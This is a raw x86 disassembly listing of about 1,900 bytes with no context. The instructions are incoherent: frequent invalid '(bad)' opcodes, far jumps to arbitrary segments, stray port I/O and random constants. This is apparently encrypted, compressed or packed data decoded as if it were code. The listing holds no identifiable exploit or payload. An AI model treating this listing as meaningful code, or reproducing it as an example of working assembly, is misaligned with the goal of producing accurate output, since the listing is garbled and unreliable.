  419cce:	jmp    0x442e5cbd
  419cd3:	inc    esp
  419cd4:	(bad)  
  419cd5:	sub    BYTE PTR [edi+0x57],dh
  419cd8:	cwde   
  419cd9:	(bad)  
  419cdb:	js     0x419cd0
  419cdd:	xor    al,0xaf
  419cdf:	mov    WORD PTR [edi],?
  419ce1:	pushf  
  419ce2:	sbb    edi,DWORD PTR [eax-0x71]
  419ce5:	jns    0x419d2c
  419ce7:	inc    esp
  419ce8:	repz push ebx
  419cea:	mov    WORD PTR [ebx],cs
  419cec:	std    
  419ced:	imul   ebx,DWORD PTR [ebx+eiz*2+0x79],0x62
  419cf2:	jb     0x419d6d
  419cf4:	xor    al,0xbd
  419cf6:	or     ebp,DWORD PTR [edi-0x60]
  419cf9:	lock jo 0x419cbc
  419cfc:	cwde   
  419cfd:	add    ebx,DWORD PTR [edx+edi*4+0x2ac8e8b2]
  419d04:	enter  0x63de,0x23
  419d08:	aaa    
  419d09:	pop    dx
  419d0b:	out    0x5d,eax
  419d0d:	jno    0x419d2d
  419d0f:	lods   eax,DWORD PTR ds:[esi]
  419d10:	jbe    0x419d67
  419d12:	sti    
  419d13:	push   esi
  419d14:	xchg   edx,eax
  419d15:	mov    dh,0x44
  419d17:	and    al,0xdf
  419d19:	mov    edx,0x813c6a96
  419d1e:	mov    ch,0xf
  419d20:	jns    0x419d68
  419d22:	cwde   
  419d23:	ins    DWORD PTR es:[edi],dx
  419d24:	dec    edi
  419d25:	jge    0x419d2c
  419d27:	jo     0x419cbc
  419d29:	pop    ds
  419d2a:	sbb    BYTE PTR [ebx+ebp*2],al
  419d2d:	cmp    al,0x99
  419d2f:	push   cs
  419d30:	mov    ch,0x7
  419d32:	jo     0x419cb6
  419d34:	inc    ebx
  419d35:	pop    edx
  419d36:	cmp    BYTE PTR [edi+edi*2],ah
  419d39:	je     0x419daa
  419d3b:	lods   eax,DWORD PTR ds:[esi]
  419d3c:	push   es
  419d3d:	inc    ebp
  419d3e:	cs lahf 
  419d40:	fimul  DWORD PTR [ebp+0x3a]
  419d43:	lods   al,BYTE PTR ds:[esi]
  419d44:	inc    ebp
  419d45:	inc    BYTE PTR [edx+0x12]
  419d48:	in     al,0xce
  419d4a:	fnstcw WORD PTR [esi]
  419d4c:	std    
  419d4d:	xor    edx,ebp
  419d4f:	jmp    0xa0a5:0x50c5874a
  419d56:	into   
  419d57:	jo     0x419d4f
  419d59:	mov    cl,0x52
  419d5b:	push   esp
  419d5c:	cmp    eax,0x80febaae
  419d61:	or     eax,0x5b2b6f9
  419d66:	or     ch,BYTE PTR [ecx-0x242431ec]
  419d6c:	aam    0x18
  419d6e:	or     cl,ch
  419d70:	shl    DWORD PTR [edx+ebp*4+0x1d],1
  419d74:	mov    bh,0x5a
  419d76:	mov    al,ds:0xaaa2e2c2
  419d7b:	mov    ebp,0xc28c1f1
  419d80:	mov    ah,bl
  419d82:	(bad)  [esi]
  419d84:	test   cl,cl
  419d86:	jnp    0x419dbc
  419d88:	or     al,0x90
  419d8b:	ret    
  419d8c:	jmp    0x323a:0xb97e4aab
  419d93:	and    al,0x81
  419d95:	fisttp QWORD PTR [esi-0x1530aff1]
  419d9b:	jns    0x419dd9
  419d9d:	sbb    ch,BYTE PTR [eax]
  419d9f:	loopne 0x419d6d
  419da1:	daa    
  419da2:	mov    dh,BYTE PTR [ebx+edi*2-0x76]
  419da6:	mov    cl,0x2b
  419da8:	loop   0x419da0
  419daa:	pop    es
  419dab:	lock xlat BYTE PTR ds:[ebx]
  419dad:	adc    eax,0xa9f0edef
  419db2:	fist   DWORD PTR [eax+0x2d]
  419db5:	push   0xffffffb5
  419db7:	ret    
  419db8:	daa    
  419db9:	or     eax,0x70ff3479
  419dbe:	jae    0x419d54
  419dc0:	dec    edx
  419dc1:	jb     0x419d83
  419dc3:	mov    ch,0x8a
  419dc5:	mov    esp,0x9a210d9d
  419dca:	pop    edi
  419dcb:	jmp    0xb465:0x5a1946d
  419dd2:	adc    bh,BYTE PTR [ecx*1-0x2960e801]
  419dd9:	out    0x2a,al
  419ddb:	cmp    al,0xc0
  419ddd:	lods   eax,DWORD PTR ds:[esi]
  419dde:	or     ah,dl
  419de0:	in     al,0x2e
  419de2:	je     0x419e1c
  419de4:	cmc    
  419de5:	xchg   esp,eax
  419de6:	stos   BYTE PTR es:[edi],al
  419de7:	sub    ebx,DWORD PTR [ebx-0x7c]
  419dea:	xor    ah,dh
  419dec:	jge    0x419e2e
  419dee:	xor    eax,0x8f76a863
  419df3:	xor    eax,0x2f856511
  419df8:	test   BYTE PTR [bp+0x7c],ch
  419dfc:	gs sub cl,dl
  419dff:	sbb    edx,edx
  419e01:	pop    esi
  419e02:	fs jg  0x419d95
  419e05:	push   ecx
  419e06:	push   eax
  419e07:	push   esp
  419e08:	mov    ah,0x95
  419e0a:	aad    0x6b
  419e0c:	mov    eax,ds:0x5516f52e
  419e11:	mov    esi,0xb0ec28a
  419e16:	cli    
  419e17:	sti    
  419e18:	xchg   edx,eax
  419e19:	neg    BYTE PTR [esp+ebp*1+0x1c]
  419e1d:	outs   dx,BYTE PTR ds:[esi]
  419e1e:	dec    esp
  419e1f:	test   DWORD PTR [ecx-0x62],0x48630d47
  419e26:	call   0x628d:0xe813c54f
  419e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e2e:	or     al,0xbe
  419e30:	mov    al,ds:0x5ca95005
  419e35:	xchg   edi,eax
  419e36:	test   DWORD PTR [esi+ecx*4],ebp
  419e39:	jle    0x419e73
  419e3b:	ficom  DWORD PTR [esi+ebp*8]
  419e3e:	push   edx
  419e3f:	push   esp
  419e40:	jno    0x419e2b
  419e42:	retf   0xc18c
  419e45:	mov    ch,0xa1
  419e47:	popa   
  419e48:	ja     0x419e2a
  419e4a:	jno    0x419e96
  419e4c:	aas    
  419e4d:	sub    eax,0xda3c1955
  419e52:	repz scas al,BYTE PTR es:[edi]
  419e54:	cmp    DWORD PTR [edx-0x3ac72da8],edi
  419e5a:	das    
  419e5b:	adc    al,0xc0
  419e5d:	push   esp
  419e5e:	xor    al,dl
  419e60:	ds push edx
  419e62:	pop    ebx
  419e63:	bound  ecx,QWORD PTR [edx]
  419e65:	loop   0x419eab
  419e67:	push   esp
  419e68:	mov    dl,0x5c
  419e6a:	xor    DWORD PTR [eax+ecx*1-0x6d1377b0],esp
  419e71:	je     0x419e37
  419e73:	repnz shl bh,cl
  419e76:	stc    
  419e77:	xchg   edi,eax
  419e78:	or     edx,DWORD PTR [ebp+0x2b8c2329]
  419e7e:	sbb    edi,DWORD PTR [edi+0x61]
  419e81:	fist   DWORD PTR [esi]
  419e83:	jg     0x419e8d
  419e85:	scas   al,BYTE PTR es:[edi]
  419e86:	aas    
  419e87:	test   BYTE PTR [edx+0xd],0xd5
  419e8b:	mov    ds:0xfb99ec79,al
  419e90:	mov    eax,ds:0xe0d8cabf
  419e95:	sbb    esi,DWORD PTR [eax]
  419e97:	mul    BYTE PTR [edx-0x7d12e5ac]
  419e9d:	ret    0x7669
  419ea0:	push   es
  419ea1:	repz adc edi,DWORD PTR [esi]
  419ea4:	imul   esp,DWORD PTR [edx],0x13
  419ea7:	sahf   
  419ea8:	test   eax,0xc3533bd7
  419ead:	ins    DWORD PTR es:[edi],dx
  419eae:	fidiv  WORD PTR [esi+0x53]
  419eb1:	jmp    0x419f26
  419eb3:	or     al,0xbf
  419eb5:	adc    DWORD PTR [ebx-0x47],esp
  419eb8:	inc    ecx
  419eb9:	fwait
  419eba:	push   ss
  419ebb:	and    ch,BYTE PTR [eax+0x3a241a02]
  419ec1:	mov    WORD PTR ds:[edx-0x6fd6cd20],gs
  419ec8:	gs pop ds
  419eca:	pusha  
  419ecb:	std    
  419ecc:	cmp    al,0x12
  419ece:	pop    eax
  419ecf:	fstp   QWORD PTR [ebx+edx*4-0x43]
  419ed3:	xchg   edx,eax
  419ed4:	mov    ?,WORD PTR [ebp+0x22dbfc5b]
  419eda:	adc    dh,BYTE PTR [edi]
  419edc:	xchg   DWORD PTR [eax-0x77],edx
  419edf:	pop    esi
  419ee0:	imul   eax,DWORD PTR [edx-0x774e2876],0x4b
  419ee7:	fcom   DWORD PTR [esi+0x57]
  419eea:	xchg   ecx,eax
  419eeb:	out    dx,al
  419eec:	or     eax,DWORD PTR [edi+0x2acaafe0]
  419ef2:	xor    ecx,DWORD PTR [ecx+0x7a696e51]
  419ef8:	pusha  
  419ef9:	adc    DWORD PTR [eax+eax*4-0xb],eax
  419efd:	pop    es
  419efe:	stos   DWORD PTR es:[edi],eax
  419eff:	fsub   st(1),st
  419f01:	mov    BYTE PTR [esi],dh
  419f03:	xor    eax,0x9a63fdb0
  419f08:	mov    al,ds:0x9918f17b
  419f0d:	push   cs
  419f0e:	lods   eax,DWORD PTR ds:[esi]
  419f0f:	adc    ah,BYTE PTR cs:[eax+edi*8]
  419f13:	xchg   dh,dl
  419f15:	call   0xf6c4:0xc2f6e222
  419f1c:	inc    ecx
  419f1d:	inc    ebx
  419f1e:	test   eax,0x3e67494d
  419f23:	lahf   
  419f24:	stos   BYTE PTR es:[edi],al
  419f25:	mov    edx,0xcc62811c
  419f2a:	fdivr  st,st(2)
  419f2c:	xchg   DWORD PTR [ebp-0x69fd2793],eax
  419f32:	retf   0x480c
  419f35:	and    al,0x8
  419f37:	arpl   WORD PTR [ecx+edx*2+0x4],di
  419f3b:	retf   
  419f3c:	add    BYTE PTR [edi-0x1b29665d],bl
  419f42:	mov    dl,0xff
  419f44:	jmp    0xb496e100
  419f49:	sub    DWORD PTR [ebp-0x32b53957],esp
  419f4f:	push   eax
  419f50:	loopne 0x419f0e
  419f52:	and    eax,0x3cfee085
  419f57:	cwde   
  419f58:	out    0x23,al
  419f5a:	lods   al,BYTE PTR ds:[esi]
  419f5b:	cld    
  419f5c:	xor    DWORD PTR [ebp+0x74],esp
  419f5f:	mov    ss,ebp
  419f61:	pop    esi
  419f62:	sub    ebx,esi
  419f64:	xor    bh,bh
  419f66:	mov    ebx,0x12bed70e
  419f6b:	pop    edi
  419f6c:	je     0x419f5f
  419f6e:	ret    0x528a
  419f71:	data16 ficomp WORD PTR [ebx+ebx*8-0xff6145f]
  419f79:	or     cl,BYTE PTR [ebp+0x27]
  419f7c:	sbb    bh,BYTE PTR [esi]
  419f7e:	mov    bh,0xbd
  419f80:	inc    ecx
  419f81:	jle    0x419f87
  419f83:	and    al,0xbc
  419f85:	je     0x419fe8
  419f87:	je     0x419f30
  419f89:	jne    0x419f5e
  419f8b:	ror    DWORD PTR [eax],cl
  419f8d:	sbb    DWORD PTR [edi+0x5f012a37],eax
  419f93:	sbb    DWORD PTR [eax+0x6a],0xffffff93
  419f97:	push   ebx
  419f98:	push   edx
  419f99:	out    0x96,eax
  419f9b:	or     al,0x76
  419f9d:	out    dx,eax
  419f9e:	shr    DWORD PTR [edi+0x35],0xa1
  419fa2:	test   BYTE PTR [edx-0x526bbe28],bh
  419fa8:	push   ebx
  419fa9:	hlt    
  419faa:	inc    eax
  419fab:	aad    0xee
  419fad:	retf   0xb57e
  419fb0:	jbe    0x419f3c
  419fb2:	mov    esi,0xe0023b1b
  419fb7:	arpl   WORD PTR [edx-0xe],bp
  419fba:	sub    eax,0x1fec0bb9
  419fbf:	imul   eax,DWORD PTR [esi-0x3b305d1c],0xe21fc417
  419fc9:	push   ebx
  419fca:	fist   DWORD PTR [ecx]
  419fcc:	cli    
  419fcd:	mov    edi,DWORD PTR [ebp-0x287d039c]
  419fd3:	adc    al,0x96
  419fd5:	(bad)  
  419fd6:	jle    0x419fe1
  419fd8:	jnp    0x419f75
  419fda:	inc    ebp
  419fdb:	ja     0x419fc6
  419fdd:	(bad)  
  419fde:	call   0xf35d:0xf5c479c3
  419fe5:	push   ecx
  419fe6:	push   es
  419fe7:	lea    eax,[esi+0xd]
  419fea:	jbe    0x419fec
  419fec:	adc    DWORD PTR [eax],0xffffffc2
  419fef:	sub    eax,0x76087f91
  419ff4:	loope  0x419ffd
  419ff6:	out    0xd0,eax
  419ff8:	fadd   st(6),st
  419ffa:	sub    eax,0xb9028566
  419fff:	xlat   BYTE PTR ds:[ebx]
  41a000:	aaa    
  41a001:	mov    dh,BYTE PTR [edx]
  41a003:	outs   dx,DWORD PTR ds:[esi]
  41a004:	jecxz  0x41a052
  41a006:	fs pop esi
  41a008:	pop    ecx
  41a009:	dec    eax
  41a00a:	mov    ebp,0x31ad695e
  41a00f:	jmp    0x8e23:0x983b7c46
  41a016:	pop    ebp
  41a017:	sub    eax,0xc4f60cca
  41a01c:	mov    edi,0x9d708e63
  41a021:	mov    ss,ebx
  41a023:	dec    esi
  41a024:	pop    ebx
  41a025:	mov    WORD PTR ds:0xf1469f7c,cs
  41a02b:	imul   eax,DWORD PTR [edx+0x1f],0xc16dd4a0
  41a032:	pop    edx
  41a033:	add    BYTE PTR [esi],bh
  41a035:	iret   
  41a036:	(bad)  
  41a038:	or     BYTE PTR gs:[ebx],bl
  41a03b:	ins    BYTE PTR es:[edi],dx
  41a03c:	mov    esi,0xa307379d
  41a041:	shl    edx,cl
  41a043:	repz (bad) 
  41a045:	mov    ah,ah
  41a047:	repz add edx,DWORD PTR ds:0x76ea1cbc
  41a04e:	repz ds fs ror esp,1
  41a053:	out    0x23,eax
  41a055:	mov    gs,WORD PTR [edi-0xa315fbf]
  41a05b:	ds xchg ebx,eax
  41a05d:	push   0x82b91423
  41a062:	scas   eax,DWORD PTR es:[edi]
  41a063:	into   
  41a064:	add    eax,0x4e0087c1
  41a069:	xor    bl,BYTE PTR ds:0xe7f8418a
  41a06f:	enter  0xcdda,0xef
  41a073:	push   0x79
  41a075:	sbb    BYTE PTR [esi+ebp*1+0x6629f2d5],al
  41a07c:	inc    esp
  41a07d:	scas   al,BYTE PTR es:[edi]
  41a07e:	ds (bad) 
  41a080:	push   ds
  41a081:	mov    ds:0x43acf605,al
  41a086:	cmp    eax,0x82594029
  41a08b:	add    edi,DWORD PTR [ebx]
  41a08d:	into   
  41a08e:	mov    ah,bh
  41a090:	out    0xe1,eax
  41a092:	inc    esp
  41a093:	add    al,0xc7
  41a095:	in     al,0x58
  41a097:	mov    ?,esi
  41a099:	or     DWORD PTR [esi],0x2c4d26c0
  41a09f:	mov    ah,BYTE PTR [esi-0x51]
  41a0a2:	dec    ebp
  41a0a3:	jp     0x41a0b3
  41a0a5:	pop    esi
  41a0a6:	mov    WORD PTR [edx+eiz*8-0x68],fs
  41a0aa:	iret   
  41a0ab:	mov    ah,0xc4
  41a0ad:	shr    BYTE PTR [ecx-0x44855986],1
  41a0b3:	adc    DWORD PTR [eax+0x6f],ebx
  41a0b6:	mov    edx,0xc5e6e183
  41a0bb:	test   eax,0x776b8685
  41a0c0:	pop    esi
  41a0c1:	xchg   esi,eax
  41a0c2:	ror    BYTE PTR [ebx],cl
  41a0c4:	mov    dh,0x6b
  41a0c6:	ret    
  41a0c7:	push   esi
  41a0c8:	aaa    
  41a0c9:	add    BYTE PTR [ebx+esi*8+0x1e],0x64
  41a0ce:	sub    esi,DWORD PTR [esp+eax*8+0x3f]
  41a0d2:	jnp    0x41a06e
  41a0d4:	xor    DWORD PTR [ebx+esi*1],0xffffffce
  41a0d8:	lods   al,BYTE PTR ds:[esi]
  41a0d9:	fnstsw WORD PTR [ecx+eax*8-0x296d95e]
  41a0e0:	xchg   esi,eax
  41a0e1:	ret    
  41a0e2:	mov    eax,ds
  41a0e4:	push   0xffffffcb
  41a0e6:	sub    dh,BYTE PTR [eax]
  41a0e8:	and    DWORD PTR [edi-0xf],esp
  41a0eb:	(bad)  
  41a0ec:	pop    DWORD PTR [ecx]
  41a0ee:	pushf  
  41a0ef:	cwde   
  41a0f0:	retf   0x3158
  41a0f3:	ret    0x53f2
  41a0f6:	pop    es
  41a0f7:	jbe    0x41a138
  41a0f9:	imul   ecx,edi,0x2b09ace6
  41a0ff:	mov    bl,0x49
  41a101:	pop    ecx
  41a102:	add    eax,0x6ae69146
  41a107:	pop    ds
  41a108:	push   edi
  41a109:	adc    edx,DWORD PTR [eax-0x1030d405]
  41a10f:	pop    es
  41a110:	fwait
  41a111:	shl    DWORD PTR [ecx],1
  41a113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a114:	mov    eax,0xb4eb953
  41a119:	xchg   esi,eax
  41a11a:	xchg   edx,eax
  41a11b:	jecxz  0x41a163
  41a11d:	xlat   BYTE PTR ds:[ebx]
  41a11e:	cmp    BYTE PTR [eax],0x36
  41a121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a122:	pop    ss
  41a123:	pop    eax
  41a124:	sar    DWORD PTR [ebx+0x37e28774],0x1f
  41a12b:	js     0x41a10d
  41a12d:	mov    dh,BYTE PTR [ecx+0x3f]
  41a130:	xor    BYTE PTR fs:[ebp-0x1c],al
  41a134:	mov    ecx,0xcd462896
  41a139:	mov    ebp,0xc7f4acd5
  41a13e:	push   ss
  41a13f:	and    al,0xf3
  41a141:	add    dl,al
  41a143:	stc    
  41a144:	repz jae 0x41a0e3
  41a147:	jb     0x41a164
  41a149:	shr    BYTE PTR [eax-0x39],cl
  41a14c:	pusha  
  41a14d:	sub    edx,DWORD PTR [esi+0x60667890]
  41a153:	call   DWORD PTR [ebx-0x6e]
  41a156:	push   ebp
  41a157:	inc    esp
  41a158:	ficom  WORD PTR [eax]
  41a15a:	stos   BYTE PTR es:[edi],al
  41a15b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a15c:	outs   dx,DWORD PTR ds:[esi]
  41a15d:	sub    esp,DWORD PTR [edx-0x2e]
  41a160:	or     BYTE PTR [ebp+0x51],bl
  41a163:	leave  
  41a164:	lods   al,BYTE PTR ds:[esi]
  41a165:	sti    
  41a166:	inc    esp
  41a167:	pop    edi
  41a168:	cwde   
  41a169:	out    0x69,eax
  41a16b:	sahf   
  41a16c:	sbb    ah,BYTE PTR [ebp-0x4e7ed4d]
  41a172:	ret    
  41a173:	enter  0xec1f,0x5e
  41a177:	pop    esi
  41a178:	scas   al,BYTE PTR es:[edi]
  41a179:	repz sbb DWORD PTR [ebx+0x23],esp
  41a17d:	cmp    al,0x43
  41a17f:	std    
  41a180:	sub    ah,BYTE PTR [ecx-0xb]
  41a183:	pop    ds
  41a184:	fcomp  st(5)
  41a186:	xchg   cl,dh
  41a188:	jp     0x41a193
  41a18a:	mov    cs,WORD PTR [ebx+0x16c80dd0]
  41a190:	pop    esi
  41a191:	loop   0x41a175
  41a193:	inc    esi
  41a194:	cmp    edx,DWORD PTR [edi]
  41a196:	adc    dl,BYTE PTR ds:0x496a44ce
  41a19c:	and    al,0xfd
  41a19e:	xor    BYTE PTR [esi-0x74],al
  41a1a1:	mov    ah,0x51
  41a1a3:	and    ch,BYTE PTR [ebp+eiz*1-0x4bbaa12d]
  41a1aa:	je     0x41a131
  41a1ac:	xlat   BYTE PTR ds:[ebx]
  41a1ad:	and    al,0x19
  41a1af:	test   BYTE PTR [edi+0x28],cl
  41a1b2:	push   ebx
  41a1b3:	std    
  41a1b4:	data16 cli 
  41a1b6:	data16 ins BYTE PTR es:[edi],dx
  41a1b8:	add    eax,0x68fb5fd6
  41a1bd:	(bad)  
  41a1be:	loope  0x41a21b
  41a1c0:	out    dx,eax
  41a1c1:	jl     0x41a1ef
  41a1c3:	adc    eax,0x1ea3a358
  41a1c8:	fistp  WORD PTR [edx+eax*2+0x45]
  41a1cc:	sub    eax,0x5ad59386
  41a1d1:	(bad)  
  41a1d2:	or     eax,0xfbec7087
  41a1d7:	sbb    DWORD PTR [esi+0x2b],eax
  41a1da:	mov    DWORD PTR [edx-0x7c],edi
  41a1dd:	add    eax,0x4786750d
  41a1e2:	inc    edi
  41a1e3:	test   BYTE PTR [ebp-0x66515b8d],al
  41a1e9:	retf   
  41a1ea:	ins    BYTE PTR es:[edi],dx
  41a1eb:	or     ebp,edx
  41a1ed:	mov    edi,0xfecb8aca
  41a1f2:	push   ecx
  41a1f3:	adc    DWORD PTR [ebx+0x28],0xc5e09ee
  41a1fa:	pop    ecx
  41a1fb:	(bad)  
  41a1fc:	cdq    
  41a1fd:	mov    ebx,0x8ee79ba8
  41a202:	aaa    
  41a203:	xchg   esp,eax
  41a204:	mov    dh,0xe9
  41a206:	aam    0x52
  41a208:	xor    dl,bl
  41a20a:	mov    ch,0x3a
  41a20c:	shr    BYTE PTR [edx+0x76],0xd2
  41a210:	cmp    al,0xa
  41a212:	sub    al,BYTE PTR [ecx]
  41a214:	push   esp
  41a215:	or     ebx,DWORD PTR [ebx]
  41a217:	(bad)  
  41a218:	shl    BYTE PTR [ebx-0xf87d52a],1
  41a21e:	arpl   WORD PTR [esi],ax
  41a220:	cmp    DWORD PTR [ebp+ebp*8+0xb3e9e2],0x3
  41a228:	dec    esp
  41a229:	arpl   WORD PTR [ebx+0x3c],sp
  41a22c:	leave  
  41a22d:	shl    DWORD PTR [edx-0x5e],cl
  41a230:	sub    al,0xbc
  41a232:	xchg   esp,eax
  41a233:	push   edx
  41a234:	mov    al,0xbe
  41a236:	cmp    DWORD PTR [eax-0x55],0x74dfd5e8
  41a23d:	paddsb mm4,QWORD PTR [edx-0x7199e894]
  41a244:	xchg   ebp,eax
  41a245:	in     al,dx
  41a246:	pop    es
  41a247:	push   edi
  41a248:	daa    
  41a249:	pop    ebp
  41a24a:	and    eax,0x50d02dba
  41a24f:	not    BYTE PTR [eax+0x5391b699]
  41a255:	dec    esp
  41a256:	out    0x6b,al
  41a258:	xlat   BYTE PTR ds:[ebx]
  41a259:	pusha  
  41a25a:	pop    es
  41a25b:	sub    BYTE PTR [esi+esi*2+0x16],bl
  41a25f:	xor    edx,DWORD PTR [esi+0x1ecb68ff]
  41a265:	sbb    eax,0x24124add
  41a26a:	dec    ebx
  41a26b:	dec    ebx
  41a26c:	retf   0x4e83
  41a26f:	mov    esi,0xf6ba8219
  41a274:	mov    ebx,0xcf01f697
  41a279:	retf   0xdb2b
  41a27c:	addr16 inc ebx
  41a27e:	mov    WORD PTR [ebx-0x80],cs
  41a281:	mov    al,ds:0xc60c6311
  41a286:	mov    bh,0xd
  41a288:	shl    BYTE PTR ds:0x65387376,0x70
  41a28f:	xchg   BYTE PTR [esi+eiz*8+0x34096270],dl
  41a296:	ins    DWORD PTR es:[edi],dx
  41a297:	jns    0x41a2d7
  41a299:	sbb    eax,DWORD PTR [edi-0x62479926]
  41a29f:	pop    esi
  41a2a0:	aaa    
  41a2a1:	jge    0x41a231
  41a2a3:	sub    al,0xe6
  41a2a5:	aam    0xf
  41a2a7:	iret   
  41a2a8:	adc    bh,al
  41a2aa:	pop    ebx
  41a2ab:	xchg   BYTE PTR [edx-0x11b3a72a],ch
  41a2b1:	jecxz  0x41a31e
  41a2b3:	ins    BYTE PTR es:[edi],dx
  41a2b4:	icebp  
  41a2b5:	rcr    BYTE PTR [esi-0x64],0xe3
  41a2b9:	enter  0xcf65,0x1b
  41a2bd:	and    al,0x85
  41a2bf:	inc    ecx
  41a2c0:	dec    edx
  41a2c1:	xchg   BYTE PTR [eax+0x6e],dl
  41a2c4:	adc    bl,BYTE PTR [ebx+eax*1+0x397b4626]
  41a2cb:	jb     0x41a332
  41a2cd:	jno    0x41a311
  41a2cf:	test   al,0xf5
  41a2d1:	mov    ebp,0xaf99f142
  41a2d6:	adc    edx,esi
  41a2d8:	fsubr  DWORD PTR [esi-0x563b2f76]
  41a2de:	cmp    DWORD PTR [esi],0x76
  41a2e1:	fwait
  41a2e2:	add    dh,BYTE PTR [ebp-0x7852d7d7]
  41a2e8:	xor    eax,0xe3cfcc92
  41a2ed:	lods   eax,DWORD PTR ds:[esi]
  41a2ee:	scas   al,BYTE PTR es:[edi]
  41a2ef:	mov    edi,0x3be7c044
  41a2f4:	leave  
  41a2f5:	outs   dx,DWORD PTR ds:[esi]
  41a2f6:	inc    ebp
  41a2f7:	std    
  41a2f8:	and    esp,DWORD PTR [ebp+0x6d]
  41a2fb:	jge    0x41a2c1
  41a2fd:	adc    eax,0xb2028576
  41a302:	cmp    eax,0x28ab9ebd
  41a307:	jmp    0x41a2de
  41a309:	loope  0x41a361
  41a30b:	pop    ecx
  41a30c:	popa   
  41a30d:	dec    edi
  41a30e:	sub    al,0x60
  41a310:	(bad)  
  41a311:	call   0xef85:0xa85f24f9
  41a318:	imul   eax,DWORD PTR [ebp-0x34d5489c],0x21
  41a31f:	dec    esi
  41a320:	cmp    al,0x53
  41a322:	sar    BYTE PTR [ecx-0x30],cl
  41a325:	pop    edx
  41a326:	std    
  41a327:	ret    
  41a328:	xor    eax,DWORD PTR [edi+0x29546fdd]
  41a32e:	mov    ah,0xfc
  41a330:	xor    eax,0x8b08529d
  41a335:	add    eax,0xef92d676
  41a33a:	dec    ebx
  41a33b:	jb     0x41a3b0
  41a33d:	imul   eax,DWORD PTR [bx-0x45],0x31
  41a342:	rol    DWORD PTR ds:0x8795b51c,cl
  41a348:	out    dx,al
  41a349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a34a:	pop    ss
  41a34b:	inc    eax
  41a34c:	ret    0x7a60
  41a34f:	loope  0x41a393
  41a351:	gs adc al,0xb
  41a354:	fadd   st(4),st
  41a356:	lods   eax,DWORD PTR ds:[esi]
  41a357:	dec    esi
  41a358:	lock test eax,0x242bd605
  41a35e:	jb     0x41a2ee
  41a360:	loope  0x41a2e7
  41a362:	and    al,0x65
  41a364:	xchg   edi,eax
  41a365:	es shl ecx,cl
  41a368:	cli    
  41a369:	add    DWORD PTR [ecx+0x7b],eax
  41a36c:	mov    esp,0x7d00af0
  41a371:	xor    DWORD PTR [edx-0x413ee132],ecx
  41a377:	sub    BYTE PTR [ebx],dl
  41a379:	icebp  
  41a37a:	xchg   DWORD PTR ds:0x1c616d5d,ebx
  41a380:	int3   
  41a381:	adc    eax,DWORD PTR [ebx]
  41a383:	sub    eax,ebx
  41a385:	popa   
  41a386:	dec    eax
  41a387:	arpl   WORD PTR [eax-0x22a43e86],di
  41a38d:	lock inc ebp
  41a38f:	rcr    ecx,0xa
  41a392:	mov    edi,0x2f10e1ac
  41a397:	cmp    DWORD PTR [ebp+0x3f],0x5e6b9cea
  41a39e:	loopne 0x41a370
  41a3a0:	jae    0x41a3b0
  41a3a2:	jb     0x41a3f8
  41a3a4:	repnz aad 0xdb
  41a3a7:	leave  
  41a3a8:	sub    ebp,DWORD PTR [edx+0x251227dd]
  41a3ae:	push   es
  41a3af:	push   edi
  41a3b0:	sub    ebx,esi
  41a3b2:	test   BYTE PTR [ebp+0x1e],ch
  41a3b5:	mov    BYTE PTR [esi],cl
  41a3b7:	mov    BYTE PTR gs:[ecx],al
  41a3ba:	mov    ds:0xd3492250,al
  41a3bf:	push   0xffffffd5
  41a3c1:	rcr    DWORD PTR [ebx+eiz*4+0x1b],1
  41a3c5:	mov    al,ds:0xb23617dc
  41a3ca:	cmp    DWORD PTR [ecx+0x1e0e6b27],edx
  41a3d0:	mov    al,0x29
  41a3d2:	push   eax
  41a3d3:	add    al,0xc2
  41a3d5:	pop    ss
  41a3d6:	sti    
  41a3d7:	mul    DWORD PTR [ebx+0x3c]
  41a3da:	adc    bl,dl
  41a3dc:	mov    bl,0x73
  41a3de:	adc    al,al
  41a3e0:	mov    ch,0xce
  41a3e2:	sub    eax,0xd91d943d
  41a3e7:	and    dh,dl
  41a3e9:	lahf   
  41a3ea:	adc    ch,0x26
  41a3ed:	push   edx
  41a3ee:	inc    ebx
  41a3ef:	(bad)  
  41a3f0:	lea    edi,[eax-0x3c93c523]
  41a3f6:	jbe    0x41a3f3
  41a3f8:	dec    ebx
  41a3f9:	add    dl,BYTE PTR [edx-0x6e]
  41a3fc:	pop    ebp
  41a3fd:	loopne 0x41a401
  41a3ff:	mov    edi,DWORD PTR [ebp+edi*4+0x30]
  41a403:	and    ecx,edx
  41a405:	mov    ebx,0x84708ba3
  41a40a:	jno    0x41a405
  41a40c:	stc    
  41a40d:	aaa    
  41a40e:	shl    DWORD PTR [ecx+0x31],1
  41a411:	nop
  41a412:	push   esi
  41a413:	pop    es
  41a414:	pop    ss
  41a415:	pop    esi
  41a416:	and    esi,DWORD PTR [ecx]
  41a418:	or     dh,BYTE PTR [eax]
  41a41a:	aam    0x7f
  41a41c:	cld    
  41a41d:	dec    edx
  41a41e:	or     ecx,esp
  41a420:	xor    eax,0xf9c7345d
  41a425:	cmp    BYTE PTR [ecx+0x1613f95],dl
  41a42b:	and    eax,0xb0a82ad6
  41a430:	retf   
  41a431:	aas    
  41a432:	mov    eax,0x22d4a62e
  41a437:	sbb    eax,ecx
  41a439:	retf   0xfe8d
  41a43c:	pop    eax
  41a43d:	shl    DWORD PTR [eax],0x6b
  41a440:	and    bl,cl
  41a442:	mov    edi,0x5c1ec432
  41a447:	in     eax,0x1e
  41a449:	push   0xffffff8b
  41a44b:	jecxz  0x41a3e4
  41a44d:	inc    ecx
  41a44e:	test   ecx,edi
  41a450:	push   ebx
  41a451:	lock cmp al,0xb6
  41a454:	sub    eax,0xab922369
  41a459:	push   edx
  41a45a:	lea    ebx,[eax]
  41a45c:	and    al,0xe2
  41a45e:	mov    dl,0xd0
  41a460:	in     eax,dx
  41a461:	(bad)  [eax+0x5b]
  41a464:	imul   edx,DWORD PTR [ebp-0x22795dc0],0x1cb209bc
  41a46e:	add    DWORD PTR [eax],ebp
  41a470:	mov    ds:0xf4feb85c,eax
  41a475:	ja     0x41a463
  41a477:	ror    DWORD PTR [ecx+edi*2-0x75250d6a],1
  41a47e:	push   ecx
  41a47f:	out    dx,eax
  41a480:	ret    
  41a481:	test   DWORD PTR [esi+0x5589f338],0xc36a69bc
  41a48b:	retf   
  41a48c:	adc    BYTE PTR [esi],dl
  41a48e:	aad    0xaa
